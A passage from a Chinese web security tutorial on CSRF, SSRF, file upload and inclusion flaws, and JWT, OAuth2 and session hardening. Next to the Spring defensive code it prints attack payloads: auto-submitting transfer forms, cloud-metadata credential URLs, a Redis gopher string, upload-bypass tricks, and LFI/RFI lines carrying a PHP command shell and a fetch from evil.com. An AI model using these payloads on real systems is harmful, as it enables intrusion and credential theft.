    │                   │    合法请求并执行   │
    │                   │                    │
═══════════════════════════════════════════════════════════════════
```

### 5.2 GET型CSRF

```html
<!-- GET型CSRF - 通过img标签自动触发 -->
<img src="https://bank.example.com/transfer?to=hacker&amount=10000" style="display:none">

<!-- 通过link标签 -->
<link rel="stylesheet" href="https://bank.example.com/transfer?to=hacker&amount=10000">

<!-- 通过iframe -->
<iframe src="https://bank.example.com/transfer?to=hacker&amount=10000" style="display:none"></iframe>
```

### 5.3 POST型CSRF

```html
<!-- POST型CSRF - 自动提交表单 -->
<form id="csrfForm" action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>

<!-- 更隐蔽的方式 - 使用fetch -->
<script>
    fetch('https://bank.example.com/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'to=hacker&amount=10000'
    });
</script>
```

### 5.4 SameSite Cookie属性

SameSite是防御CSRF的重要Cookie属性，控制跨站请求时是否携带Cookie。

```
SameSite属性值对比
═══════════════════════════════════════════════════════════════════

┌──────────┬────────────────────────┬──────────────────────────┐
│  属性值   │      行为描述           │    安全性/兼容性          │
├──────────┼────────────────────────┼──────────────────────────┤
│ Strict   │ 完全禁止跨站发送Cookie  │ 最安全,但影响用户体验     │
│          │ 从外部链接进入也不携带  │ (从搜索引擎点入需重新登录)│
│          │                        │                          │
│ Lax      │ GET导航请求携带Cookie  │ 安全性与可用性的平衡      │
│          │ POST/iframe/img不携带  │ 现代浏览器默认值          │
│          │                        │                          │
│ None     │ 允许跨站发送Cookie     │ 必须同时设置Secure属性    │
│          │ 所有请求都携带Cookie   │ 第三方集成场景使用        │
└──────────┴────────────────────────┴──────────────────────────┘

各种请求类型的SameSite行为:
═══════════════════════════════════════════════════════════════════

请求类型              示例                    Strict  Lax    None
──────────────────────────────────────────────────────────────
顶级导航(GET)         点击链接               ✗       ✓      ✓
顶级导航(POST)        表单提交               ✗       ✗      ✓
iframe                嵌入页面               ✗       ✗      ✓
AJAX/Fetch            XMLHttpRequest         ✗       ✗      ✓
img                   <img>标签              ✗       ✗      ✓
script                <script>标签           ✗       ✗      ✓
═══════════════════════════════════════════════════════════════════
```

**Spring Boot SameSite配置：**

```java
@Configuration
public class SameSiteCookieConfig {

    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setSameSite("Strict");
        serializer.setUseHttpOnlyCookie(true);
        serializer.setUseSecureCookie(true);
        return serializer;
    }
}
```

### 5.5 CSRF Token机制

CSRF Token是防御CSRF的核心机制，通过在请求中附加服务器生成的随机Token来验证请求的合法性。

```
CSRF Token验证流程
═══════════════════════════════════════════════════════════════════

  浏览器                         服务器
    │                              │
    │ 1.GET /form                  │
    │ ──────────────────────────→ │
    │                              │ 生成随机Token
    │                              │ 存入Session: csrf_token=abc123
    │ 2.HTML+Hidden Token         │
    │ ←────────────────────────── │
    │ <input type="hidden"         │
    │   name="_csrf"              │
    │   value="abc123">           │
    │                              │
    │ 3.POST /form + Token        │
    │ ──────────────────────────→ │
    │ _csrf=abc123                │ 比对Session中的Token
    │                              │ ✓ 一致 → 处理请求
    │                              │ ✗ 不一致 → 拒绝请求
    │ 4.处理结果                   │
    │ ←────────────────────────── │
═══════════════════════════════════════════════════════════════════
```

### 5.6 Spring Security CSRF防护

```java
@Configuration
@EnableWebSecurity
public class CsrfSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(csrfTokenRepository())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
                .ignoringRequestMatchers(
                    "/api/public/**",
                    "/api/webhook/**",
                    "/api/payment/callback/**"
                )
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            );
        return http.build();
    }

    @Bean
    public CsrfTokenRepository csrfTokenRepository() {
        CookieCsrfTokenRepository repository = CookieCsrfTokenRepository.withHttpOnlyFalse();
        repository.setCookiePath("/");
        repository.setCookieMaxAge(3600);
        repository.setHeaderName("X-CSRF-TOKEN");
        repository.setParameterName("_csrf");
        return repository;
    }
}
```

**SPA应用CSRF集成：**

```java
@Configuration
@EnableWebSecurity
public class SpaCsrfConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
            )
            .addFilterAfter(new CsrfCookieFilter(), BasicAuthenticationFilter.class);
        return http.build();
    }
}

public class CsrfCookieFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        CsrfToken csrfToken = (CsrfToken) request.getAttribute(CsrfToken.class.getName());
        if (csrfToken != null) {
            response.setHeader("X-CSRF-TOKEN", csrfToken.getToken());
        }
        filterChain.doFilter(request, response);
    }
}
```

```javascript
// 前端Axios CSRF拦截器
import axios from 'axios';

const api = axios.create({
    baseURL: '/api',
    withCredentials: true
});

api.interceptors.request.use(config => {
    const csrfToken = getCookie('XSRF-TOKEN');
    if (csrfToken) {
        config.headers['X-XSRF-TOKEN'] = csrfToken;
    }
    return config;
});

function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
}
```

### 5.7 FAQ

**Q1: 使用JWT还需要CSRF防护吗？**

A: 如果JWT存储在Cookie中（且Cookie未设置SameSite=Strict），仍然需要CSRF防护。如果JWT存储在localStorage/sessionStorage中，则不需要CSRF防护（因为JavaScript无法自动附加到跨站请求中），但会面临XSS窃取Token的风险。

**Q2: 为什么API要豁免CSRF？**

A: 无状态REST API通常使用Bearer Token（在Authorization头中传递），浏览器不会自动附加此头部到跨站请求，因此CSRF风险较低。但Cookie-based的API仍需CSRF防护。

**Q3: SameSite=Strict是否可以完全替代CSRF Token？**

A: 理论上Strict可以阻止大多数CSRF攻击，但不建议完全依赖：1) 老浏览器不支持SameSite；2) Strict影响从外部链接进入的用户体验；3) 最佳实践是SameSite + CSRF Token双重防护。

---

## 6. SSRF服务端请求伪造

### 6.1 SSRF原理与危害

SSRF（Server-Side Request Forgery）是指攻击者能够诱使服务器发起请求到攻击者指定的地址，从而访问内部网络、云元数据服务等受限资源。

```
SSRF攻击流程
═══════════════════════════════════════════════════════════════════

  攻击者                 服务器                 内网资源
    │                      │                      │
    │ 1.提交恶意URL        │                      │
    │ ──────────────────→ │                      │
    │ url=http://         │                      │
    │  169.254.169.254/   │                      │
    │  latest/meta-data/  │                      │
    │                      │                      │
    │                      │ 2.服务器发起请求      │
    │                      │ ──────────────────→ │
    │                      │                      │
    │                      │ 3.返回敏感数据        │
    │                      │ ←────────────────── │
    │                      │  (AWS密钥、内网IP等)  │
    │                      │                      │
    │ 4.获取敏感数据       │                      │
    │ ←────────────────── │                      │
═══════════════════════════════════════════════════════════════════
```

**SSRF危害等级：**

| 危害类型 | 描述 | 风险等级 |
|----------|------|----------|
| 内网探测 | 扫描内网存活主机和端口 | 高 |
| 云元数据泄露 | 获取AWS/Azure/GCP的临时凭证 | 致命 |
| 本地文件读取 | file://协议读取本地文件 | 高 |
| 内网服务攻击 | 攻击内网未防护的服务 | 高 |
| 协议利用 | gopher://dict://等协议攻击 | 高 |
| DNS重绑定 | 绕过IP白名单 | 中 |

### 6.2 内网探测

```bash
# 探测内网主机存活
url=http://192.168.1.1:80/
url=http://192.168.1.1:22/
url=http://192.168.1.1:3306/

# 云元数据获取(AWS)
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# 云元数据获取(Azure)
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# 云元数据获取(GCP)
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# 需要Header: Metadata-Flavor: Google

# 云元数据获取(阿里云)
url=http://100.100.100.200/latest/meta-data/instance-id
url=http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### 6.3 协议利用

```
SSRF协议利用
═══════════════════════════════════════════════════════════════════

file://    读取本地文件
  file:///etc/passwd
  file:///etc/shadow
  file:///proc/self/environ

gopher://  构造任意TCP数据包(MySQL/Redis/FTP等)
  gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a...
  (向Redis发送命令)

dict://    探测服务版本
  dict://127.0.0.1:6379/info

http://    访问内网HTTP服务
  http://127.0.0.1:8080/admin
  http://127.0.0.1:9200/_cat/indices  (Elasticsearch)

═══════════════════════════════════════════════════════════════════
```

### 6.4 SSRF防御方案

```java
@Service
public class SecureUrlService {

    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
    private static final Set<String> BLOCKED_HOSTS = Set.of(
        "localhost", "127.0.0.1", "0.0.0.0", "::1",
        "169.254.169.254", "100.100.100.200",
        "metadata.google.internal"
    );

    private static final int CONNECT_TIMEOUT = 5000;
    private static final int READ_TIMEOUT = 10000;

    public String fetchUrl(String urlString) {
        URL validatedUrl = validateUrl(urlString);
        String resolvedIp = resolveAndValidateIp(validatedUrl);

        try {
            HttpURLConnection connection = (HttpURLConnection) validatedUrl.openConnection();
            connection.setInstanceFollowRedirects(false);
            connection.setConnectTimeout(CONNECT_TIMEOUT);
            connection.setReadTimeout(READ_TIMEOUT);
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM ||
                responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||
                responseCode == HttpURLConnection.HTTP_SEE_OTHER) {
                String location = connection.getHeaderField("Location");
                throw new SecurityException("重定向不被允许: " + location);
            }

            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                return response.toString();
            }
        } catch (IOException e) {
            throw new RuntimeException("请求失败: " + e.getMessage(), e);
        }
    }

    private URL validateUrl(String urlString) {
        try {
            URL url = new URL(urlString);
            if (!ALLOWED_SCHEMES.contains(url.getProtocol().toLowerCase())) {
                throw new SecurityException("不支持的协议: " + url.getProtocol());
            }
            String host = url.getHost().toLowerCase();
            if (BLOCKED_HOSTS.contains(host)) {
                throw new SecurityException("不允许访问的主机: " + host);
            }
            return url;
        } catch (MalformedURLException e) {
            throw new IllegalArgumentException("无效的URL: " + urlString);
        }
    }

    private String resolveAndValidateIp(URL url) {
        try {
            InetAddress address = InetAddress.getByName(url.getHost());
            String ip = address.getHostAddress();

            if (address.isLoopbackAddress()) {
                throw new SecurityException("不允许访问回环地址: " + ip);
            }
            if (address.isLinkLocalAddress()) {
                throw new SecurityException("不允许访问链路本地地址: " + ip);
            }
            if (address.isSiteLocalAddress()) {
                throw new SecurityException("不允许访问私有网络地址: " + ip);
            }
            if (address.isAnyLocalAddress()) {
                throw new SecurityException("不允许访问通配地址: " + ip);
            }
            return ip;
        } catch (UnknownHostException e) {
            throw new IllegalArgumentException("无法解析主机: " + url.getHost());
        }
    }
}
```

**DNS重绑定防御：**

```java
@Component
public class DnsRebindingProtection {

    public void validateNoDnsRebinding(String originalHost, String originalIp) {
        try {
            String currentIp = InetAddress.getByName(originalHost).getHostAddress();
            if (!originalIp.equals(currentIp)) {
                throw new SecurityException(
                    String.format("DNS解析结果变更,可能存在DNS重绑定攻击. 原始IP: %s, 当前IP: %s",
                        originalIp, currentIp));
            }
        } catch (UnknownHostException e) {
            throw new SecurityException("DNS解析失败: " + originalHost);
        }
    }
}
```

### 6.5 FAQ

**Q1: 为什么禁用重定向很重要？**

A: 攻击者可以先让URL解析为合法公网IP，通过校验后，重定向到内网地址。如果不限制重定向，SSRF的IP校验将被绕过。

**Q2: 如何防御DNS重绑定攻击？**

A: 1) 在DNS解析后校验IP，在发起HTTP请求前再次校验IP是否一致；2) 使用自定义DNS解析器，缓存DNS结果；3) 在连接建立后再次验证连接的目标IP。

**Q3: 云环境中的SSRF危害为什么特别大？**

A: 云服务器通常通过元数据服务获取IAM临时凭证。如果SSRF可以访问元数据服务，攻击者就能获取云服务的完整权限，可能控制整个云账户。



---

## 7. 文件上传与文件包含漏洞

### 7.1 文件上传漏洞原理

文件上传漏洞是指Web应用允许用户上传文件，但未对文件类型、内容、大小进行充分校验，导致攻击者上传恶意文件（如Webshell）。

```
文件上传漏洞攻击向量
═══════════════════════════════════════════════════════════════════

  ┌──────────────────────────────────────────────────────────┐
  │                文件上传漏洞分类                           │
  ├──────────────────────────────────────────────────────────┤
  │                                                          │
  │  1. 前端校验绕过                                         │
  │     • 禁用JavaScript                                     │
  │     • 修改请求(MIME类型欺骗)                             │
  │                                                          │
  │  2. 后端校验绕过                                         │
  │     • MIME类型伪造                                       │
  │     • 文件扩展名绕过(大小写/双写/空字节)                  │
  │     • 内容检测绕过(图片马)                               │
  │                                                          │
  │  3. 服务器配置缺陷                                       │
  │     • 上传目录可执行                                     │
  │     • 解析漏洞(IIS/Nginx/Apache)                        │
  │     • 文件名未重命名                                     │
  │                                                          │
  │  4. 操作系统特性                                         │
  │     • Windows短文件名(8.3)                               │
  │     • Linux大小写敏感                                    │
  │     • NTFS Alternate Data Stream                         │
  │                                                          │
  └──────────────────────────────────────────────────────────┘
═══════════════════════════════════════════════════════════════════
```

### 7.2 文件上传绕过技术

```
文件上传绕过技术大全
═══════════════════════════════════════════════════════════════════

1. 前端JavaScript校验绕过
   - 浏览器禁用JS
   - 使用Burp Suite修改上传请求

2. MIME类型绕过
   Content-Type: image/jpeg  ← 修改为合法MIME类型
   实际上传: shell.php

3. 扩展名绕过
   - 大小写: shell.PhP, shell.pHp
   - 双写:   shell.pphphp
   - 空字节: shell.php%00.jpg (旧版本PHP)
   - 特殊字符: shell.php.    shell.php%20
   - 替代扩展名: .php3 .php4 .php5 .phtml .pht .phps

4. .htaccess上传
   上传.htaccess文件:
   AddType application/x-httpd-php .jpg
   然后上传shell.jpg,将被作为PHP执行

5. 图片马制作
   copy normal.jpg/b + shell.php/a webshell.jpg
   在图片中嵌入PHP代码

6. 解析漏洞
   IIS 6.0:   shell.asp;.jpg    → 解析为asp
   IIS 7.5:   shell.jpg/.php    → FastCGI解析漏洞
   Nginx:     shell.jpg%00.php  → 空字节解析
   Nginx:     shell.jpg/1.php   → 路径解析漏洞(cgi.fix_pathinfo)
   Apache:    shell.php.xxx     → 从右向左解析

7. Windows特性
   shell.php::DATA   → NTFS ADS绕过
   shell.php.        → 末尾点号绕过(Windows忽略)
   shell.php%80      → 特殊字符绕过

═══════════════════════════════════════════════════════════════════
```

### 7.3 安全文件上传实现

```java
@Service
public class SecureFileUploadService {

    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024;
    private static final Set<String> ALLOWED_EXTENSIONS = Set.of(
        "jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "xls", "xlsx"
    );
    private static final Set<String> ALLOWED_MIME_TYPES = Set.of(
        "image/jpeg", "image/png", "image/gif",
        "application/pdf",
        "application/msword",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "application/vnd.ms-excel",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    );
    private static final Set<String> DANGEROUS_EXTENSIONS = Set.of(
        "jsp", "jspx", "php", "php3", "php4", "php5", "phtml",
        "asp", "aspx", "exe", "dll", "bat", "cmd", "sh",
        "py", "pl", "rb", "war", "jar", "class",
        "htaccess", "htpasswd"
    );
    private static final Pattern FILENAME_PATTERN = Pattern.compile("^[a-zA-Z0-9._-]+$");

    @Value("${file.upload.directory}")
    private String uploadDirectory;

    @Autowired
    private VirusScanService virusScanService;

    public UploadResult upload(MultipartFile file) {
        validateFile(file);

        String originalFilename = file.getOriginalFilename();
        String extension = extractExtension(originalFilename);

        validateExtension(extension);
        validateMimeType(file.getContentType(), extension);
        validateFileContent(file, extension);
        validateFilename(originalFilename);

        String safeFilename = generateSafeFilename(extension);
        Path uploadPath = Paths.get(uploadDirectory).toAbsolutePath().normalize();
        Path filePath = uploadPath.resolve(safeFilename).normalize();

        if (!filePath.startsWith(uploadPath)) {
            throw new SecurityException("路径遍历攻击检测");
        }

        try {
            Files.createDirectories(uploadPath);
            Files.copy(file.getInputStream(), filePath, StandardCopyOption.REPLACE_EXISTING);
            virusScanService.scan(filePath);
            setReadOnlyPermissions(filePath);
            return UploadResult.success(safeFilename, filePath.toString(), file.getSize());
        } catch (IOException e) {
            throw new RuntimeException("文件保存失败", e);
        }
    }

    private void validateFile(MultipartFile file) {
        if (file == null || file.isEmpty()) {
            throw new IllegalArgumentException("文件不能为空");
        }
        if (file.getSize() > MAX_FILE_SIZE) {
            throw new IllegalArgumentException("文件大小超过限制");
        }
    }

    private void validateExtension(String extension) {
        if (extension == null || extension.isEmpty()) {
            throw new IllegalArgumentException("文件扩展名不能为空");
        }
        String lowerExt = extension.toLowerCase();
        if (DANGEROUS_EXTENSIONS.contains(lowerExt)) {
            throw new SecurityException("不允许的文件类型: " + extension);
        }
        if (!ALLOWED_EXTENSIONS.contains(lowerExt)) {
            throw new SecurityException("不允许的文件扩展名: " + extension);
        }
    }

    private void validateMimeType(String contentType, String extension) {
        if (contentType == null || !ALLOWED_MIME_TYPES.contains(contentType.toLowerCase())) {
            throw new SecurityException("不允许的MIME类型: " + contentType);
        }
        Map<String, Set<String>> mimeExtensionMap = Map.of(
            "image/jpeg", Set.of("jpg", "jpeg"),
            "image/png", Set.of("png"),
            "image/gif", Set.of("gif"),
            "application/pdf", Set.of("pdf")
        );
        Set<String> expectedExtensions = mimeExtensionMap.get(contentType.toLowerCase());
        if (expectedExtensions != null && !expectedExtensions.contains(extension.toLowerCase())) {
            throw new SecurityException("MIME类型与文件扩展名不匹配");
        }
    }

    private void validateFileContent(MultipartFile file, String extension) {
        try {
            byte[] bytes = file.getBytes();
            String magicBytes = bytesToHex(Arrays.copyOfRange(bytes, 0, Math.min(16, bytes.length)));
            Map<String, String> magicNumberMap = Map.of(
                "ffd8ffe0", "jpg",
                "ffd8ffe1", "jpg",
                "89504e47", "png",
                "47494638", "gif",
                "25504446", "pdf"
            );
            String detectedType = null;
            for (Map.Entry<String, String> entry : magicNumberMap.entrySet()) {
                if (magicBytes.startsWith(entry.getKey())) {
                    detectedType = entry.getValue();
                    break;
                }
            }
            if (detectedType != null && !detectedType.equals(extension.toLowerCase())) {
                throw new SecurityException("文件实际类型与扩展名不匹配");
            }
        } catch (IOException e) {
            throw new RuntimeException("文件内容验证失败", e);
        }
    }

    private void validateFilename(String filename) {
        if (filename == null || !FILENAME_PATTERN.matcher(filename).matches()) {
            throw new SecurityException("文件名包含非法字符");
        }
    }

    private String generateSafeFilename(String extension) {
        return UUID.randomUUID().toString() + "." + extension.toLowerCase();
    }

    private void setReadOnlyPermissions(Path filePath) throws IOException {
        filePath.toFile().setReadOnly();
        filePath.toFile().setExecutable(false);
    }

    private String extractExtension(String filename) {
        if (filename == null) return null;
        int lastDot = filename.lastIndexOf('.');
        if (lastDot == -1 || lastDot == filename.length() - 1) return null;
        String ext = filename.substring(lastDot + 1);
        if (ext.contains(".")) {
            throw new SecurityException("文件扩展名不合法: 双扩展名");
        }
        return ext;
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}
```

### 7.4 文件包含漏洞

文件包含漏洞（LFI/RFI）允许攻击者通过动态包含文件来读取敏感文件或执行恶意代码。

```
文件包含漏洞分类
═══════════════════════════════════════════════════════════════════

  LFI (本地文件包含)
  ─────────────────
  ?page=../../../etc/passwd
  ?page=../../../proc/self/environ
  ?page=php://filter/convert.base64-encode/resource=index.php
  ?page=php://input (POST body中注入PHP代码)
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pw==
  ?page=/var/log/apache2/access.log (日志注入)

  RFI (远程文件包含)
  ─────────────────
  ?page=http://evil.com/shell.txt
  ?page=ftp://evil.com/shell.txt

  PHP Wrapper利用
  ────────────────
  php://filter     读取源码
  php://input      执行POST数据
  data://          执行内联代码
  zip://           从ZIP中包含文件
  phar://          从PHAR中包含文件

═══════════════════════════════════════════════════════════════════
```

**Java文件包含防御：**

```java
@Service
public class SecureTemplateService {

    private static final Set<String> ALLOWED_TEMPLATES = Set.of(
        "home", "about", "contact", "products", "services", "blog"
    );

    private static final Path TEMPLATE_BASE_DIR = Paths.get("/app/templates").toAbsolutePath().normalize();

    public String renderTemplate(String templateName) {
        if (!ALLOWED_TEMPLATES.contains(templateName)) {
            throw new SecurityException("不允许的模板名称: " + templateName);
        }

        Path templatePath = TEMPLATE_BASE_DIR.resolve(templateName + ".html").normalize();

        if (!templatePath.startsWith(TEMPLATE_BASE_DIR)) {
            throw new SecurityException("路径遍历攻击检测");
        }

        if (!Files.exists(templatePath)) {
            throw new IllegalArgumentException("模板不存在: " + templateName);
        }

        try {
            return Files.readString(templatePath, StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new RuntimeException("读取模板失败", e);
        }
    }
}
```

### 7.5 FAQ

**Q1: 如何防止图片马？**

A: 1) 验证文件Magic Bytes（文件头）；2) 对图片进行二次渲染（用ImageIO读取后重新写入，会破坏嵌入的代码）；3) 服务器端设置上传目录禁止脚本执行。

**Q2: 文件上传后为什么要重命名？**

A: 1) 防止文件名注入攻击（如../../../shell.php）；2) 防止通过文件名猜测其他用户上传的文件；3) 避免特殊字符导致的解析漏洞。使用UUID重命名是最安全的做法。

**Q3: 路径遍历漏洞如何防御？**

A: 1) 使用白名单校验文件名；2) 使用Path.normalize()和Path.startsWith()检测路径遍历；3) 使用随机生成的文件名替代用户输入的文件名；4) 限制文件操作在指定目录内。

---

## 8. 认证与授权安全

### 8.1 JWT安全

JWT（JSON Web Token）是无状态认证的常用方案，但其安全性需要仔细考量。

```
JWT结构
═══════════════════════════════════════════════════════════════════

  Header.Payload.Signature

  Header (Base64URL编码):
  {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "key-2024-01"
  }

  Payload (Base64URL编码):
  {
    "sub": "user123",
    "name": "张三",
    "role": "user",
    "iat": 1700000000,
    "exp": 1700003600,
    "jti": "unique-token-id",
    "iss": "https://auth.example.com",
    "aud": "https://api.example.com"
  }

  Signature:
  RSASHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    privateKey
  )

═══════════════════════════════════════════════════════════════════
```

**JWT常见漏洞与防御：**

```
┌────────────────────┬────────────────────────┬───────────────────┐
│  漏洞               │    攻击方式             │   防御方案         │
├────────────────────┼────────────────────────┼───────────────────┤
│ 算法None攻击       │ alg设为"none"          │ 服务端必须验证算法 │
│ RS256→HS256伪造    │ 修改alg为HS256         │ 固定算法,不信任alg│
│ 密钥爆破           │ 暴力破解HS256密钥      │ 使用强密钥/RS256  │
│ 修改payload        │ 篡改claim值            │ 验证签名完整性     │
│ Token过期绕过      │ 删除或修改exp          │ 强制验证exp       │
│ JWK注入           │ 注入公钥               │ 不信任JWT中的jwk  │
│ Kid注入           │ kid指向恶意文件/SQL    │ 白名单校验kid     │
│ Token重放         │ 截获Token重复使用       │ 使用jti+短期有效  │
└────────────────────┴────────────────────────┴───────────────────┘
```

**安全JWT实现：**

```java
@Component
public class SecureJwtTokenProvider {

    private static final String ISSUER = "https://auth.example.com";
    private static final String AUDIENCE = "https://api.example.com";
    private static final long ACCESS_TOKEN_VALIDITY = 3600_000L;
    private static final long REFRESH_TOKEN_VALIDITY = 86400_000L * 7;

    private final Key signingKey;
    private final TokenBlacklistService tokenBlacklistService;

    public SecureJwtTokenProvider(
            @Value("${jwt.private-key-path}") String privateKeyPath,
            TokenBlacklistService tokenBlacklistService) throws Exception {
        this.signingKey = loadPrivateKey(privateKeyPath);
        this.tokenBlacklistService = tokenBlacklistService;
    }

    public String createAccessToken(User user) {
        long now = System.currentTimeMillis();
        return Jwts.builder()
            .header().add("kid", "key-2024-01").and()
            .subject(user.getId().toString())
            .issuer(ISSUER)
            .audience().add(AUDIENCE).and()
            .claim("username", user.getUsername())
            .claim("roles", user.getRoles())
            .claim("permissions", user.getPermissions())
            .id(UUID.randomUUID().toString())
            .issuedAt(new Date(now))
            .expiration(new Date(now + ACCESS_TOKEN_VALIDITY))
            .signWith(signingKey, Jwts.SIG.RS256)
            .compact();
    }

    public String createRefreshToken(User user) {
        long now = System.currentTimeMillis();
        return Jwts.builder()
            .subject(user.getId().toString())
            .issuer(ISSUER)
            .audience().add(AUDIENCE).and()
            .id(UUID.randomUUID().toString())
            .issuedAt(new Date(now))
            .expiration(new Date(now + REFRESH_TOKEN_VALIDITY))
            .claim("type", "refresh")
            .signWith(signingKey, Jwts.SIG.RS256)
            .compact();
    }

    public Claims validateToken(String token) {
        try {
            JwtParser parser = Jwts.parser()
                .verifyWith((PublicKey) signingKey)
                .requireIssuer(ISSUER)
                .requireAudience(AUDIENCE)
                .build();

            Claims claims = parser.parseSignedClaims(token).getPayload();

            if (tokenBlacklistService.isBlacklisted(claims.getId())) {
                throw new SecurityException("Token已被撤销");
            }
            return claims;
        } catch (ExpiredJwtException e) {
            throw new SecurityException("Token已过期");
        } catch (JwtException e) {
            throw new SecurityException("Token验证失败: " + e.getMessage());
        }
    }

    private PrivateKey loadPrivateKey(String keyPath) throws Exception {
        byte[] keyBytes = Files.readAllBytes(Paths.get(keyPath));
        String privateKeyPEM = new String(keyBytes, StandardCharsets.UTF_8)
            .replace("-----BEGIN PRIVATE KEY-----", "")
            .replace("-----END PRIVATE KEY-----", "")
            .replaceAll("\\s", "");
        byte[] encoded = Base64.getDecoder().decode(privateKeyPEM);
        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(encoded);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePrivate(keySpec);
    }
}
```

### 8.2 OAuth2.0安全

```
OAuth2.0授权码流程
═══════════════════════════════════════════════════════════════════

  用户(资源拥有者)     客户端应用      授权服务器      资源服务器
       │                 │               │               │
       │ 1.点击登录      │               │               │
       │ ──────────────→│               │               │
       │                 │               │               │
       │ 2.重定向到授权页面               │               │
       │ ←──────────────────────────────│               │
       │                 │               │               │
       │ 3.用户同意授权  │               │               │
       │ ───────────────────────────────→│               │
       │                 │               │               │
       │ 4.重定向回客户端+授权码          │               │
       │    ←────────────│               │               │
       │    redirect_uri?code=AUTH_CODE  │               │
       │                 │               │               │
       │                 │ 5.用授权码换Token              │
       │                 │ ─────────────→│               │
       │                 │  (包含client_secret)           │
       │                 │               │               │
       │                 │ 6.返回Access Token            │
       │                 │ ←─────────────│               │
       │                 │               │               │
       │                 │ 7.用Token访问资源              │
       │                 │ ─────────────────────────────→│
       │                 │               │               │
       │                 │ 8.返回资源    │               │
       │                 │ ←─────────────────────────────│
═══════════════════════════════════════════════════════════════════
```

**OAuth2.0常见漏洞：**

| 漏洞 | 描述 | 防御 |
|------|------|------|
| CSRF | 授权码流程缺少state参数 | 使用随机state并验证 |
| redirect_uri篡改 | 修改回调地址到恶意站点 | 白名单校验redirect_uri |
| 授权码泄露 | 授权码通过Referer泄露 | 使用PKCE增强 |
| Token泄露 | Access Token在日志中暴露 | 短期Token+刷新机制 |
| client_secret泄露 | 客户端密钥暴露 | 公共客户端使用PKCE |

**Spring Security OAuth2.0配置：**

```java
@Configuration
@EnableWebSecurity
public class OAuth2SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                .authorizationEndpoint(auth -> auth.baseUri("/oauth2/authorization"))
                .redirectionEndpoint(redir -> redir.baseUri("/login/oauth2/code/*"))
                .userInfoEndpoint(userInfo -> userInfo.userService(customOAuth2UserService()))
                .successHandler(oauth2AuthenticationSuccessHandler())
                .failureHandler(oauth2AuthenticationFailureHandler())
            )
            .oauth2Client(oauth2 -> oauth2
                .authorizationCodeGrant(codeGrant -> codeGrant
                    .authorizationRequestRepository(cookieOAuth2AuthorizationRequestRepository())
                )
            );
        return http.build();
    }

    @Bean
    public OAuth2UserService<OAuth2UserRequest, OAuth2User> customOAuth2UserService() {
        return new DefaultOAuth2UserService() {
            @Override
            public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
                OAuth2User oauth2User = super.loadUser(userRequest);
                String registrationId = userRequest.getClientRegistration().getRegistrationId();
                return processOAuth2User(registrationId, oauth2User);
            }
        };
    }
}
```

### 8.3 Session安全

```java
@Configuration
@EnableWebSecurity
public class SessionSecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .sessionFixation(fixation -> fixation.migrateSession())
                .maximumSessions(1)
                    .maxSessionsPreventsLogin(true)
                    .sessionRegistry(sessionRegistry())
            )
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
        return http.build();
    }

    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }

    @Bean
    public HttpSessionEventPublisher httpSessionEventPublisher() {
        return new HttpSessionEventPublisher();
    }
}

@Component
